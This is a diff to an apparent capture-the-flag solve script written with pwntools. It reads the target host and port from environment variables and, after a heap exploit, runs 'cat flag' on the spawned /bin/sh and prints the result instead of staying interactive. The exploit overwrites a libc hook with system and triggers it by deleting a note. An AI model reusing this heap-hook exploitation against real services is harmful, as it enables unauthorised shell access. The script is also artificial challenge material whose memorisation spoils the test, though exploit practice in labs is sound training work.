@@ -1,3 +1,5 @@
+import os
+
 from pwn import *
 
 # !!!! Parts of the solve script are a bit messy so the program sometimes pulls in more data than it should.
@@ -5,7 +7,7 @@ from pwn import *
 
 libc = ELF("./libc.so.6")
 
-p = remote("10.20.10.10", 9203)
+p = remote(os.environ["SERVICE_APP_MAIN_HOST"], int(os.environ["SERVICE_APP_MAIN_PORT"]))
 # p = process("./app")
 # p = gdb.debug("./app", gdbscript="""
 #     b * main
@@ -71,4 +73,5 @@ note_add(b"EEEEEEEE", p64(libc.symbols["system"]), 0x50) # malloc chunk with __f
 
 note_delete(3) # delete note[3] to run /bin/sh
 
-p.interactive()
+p.sendline(b"cat flag")
+print(p.recvall(timeout=10).decode(errors="replace"))
